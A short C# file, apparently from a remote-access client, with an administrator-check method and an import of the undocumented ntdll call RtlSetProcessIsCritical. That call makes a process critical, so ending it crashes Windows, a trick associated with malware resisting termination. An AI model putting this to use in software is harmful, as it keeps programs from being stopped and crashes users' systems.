using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Client.Defs
{
    internal class Check
    {
        public static bool Admin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
    }
}
